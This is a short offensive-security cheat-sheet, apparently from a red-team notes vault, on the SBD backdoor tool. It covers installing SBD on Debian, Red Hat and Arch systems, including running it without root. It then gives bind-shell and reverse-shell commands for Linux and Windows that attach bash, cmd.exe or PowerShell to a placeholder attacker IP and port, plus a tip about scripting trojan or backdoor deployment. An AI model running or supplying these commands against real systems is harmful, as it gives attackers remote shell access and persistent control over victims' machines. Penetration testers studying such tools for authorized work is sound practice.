---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
  - sbd
---
# SBD

## 01 - Setup

> [!TIP]
> You can make an automated script to deploy a trojan horse or backdoor during the initial access and maintaining access.

### 1.1 - Package Manager

#### 1.1.1 - Debian-Based

Install directly in the system.

```
$ sudo apt install -y sbd
```

Another way to install the program without root permissions is by downloading the package and extract it.

```
$ apt download sbd

$ dpkg -x sbd_*.deb work
```

Then you can just execute the program as it was portable.

```
$ work/usr/bin/sbd -h
```

#### 1.1.2 - Red Hat Distros

```
$ dnf download sbd
```

#### 1.1.3 - Arch Linux Based

You can just download the `.tar.xz` file and extract it.

```
$ wget https://mirror.archstrike.org/x86_64/archstrike/sbd-1.36-6-x86_64.pkg.tar.xz

$ tar xJf sbd-*-any.pkg.tar.xz
```

Then you can just execute the program as it was portable.

```
$ usr/bin/sbd -h
```

## 01 - Linux

### 1.1 - Bind Shell

```
$ sbd -lvnp <target_PORT> -e /bin/bash
```

### 1.2 - Reverse Shell

```
$ sbd <attacker_IP> <attacker_PORT> -e /bin/bash
```

## 02 - Windows

### 2.1 - Bind Shell

```
C:\> .\sbd.exe -lvnp <target_PORT> -e cmd.exe

C:\> .\sbd.exe -lvnp <target_PORT> -e powershell.exe
```

### 2.2 - Reverse Shell

```
C:\> .\sbd.exe <attacker_IP> <attacker_PORT> -e cmd.exe

C:\> .\sbd.exe <attacker_IP> <attacker_PORT> -e powershell.exe
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Shell Handler/Cross Platform/Manual/SBD|Shell Handler: SBD]]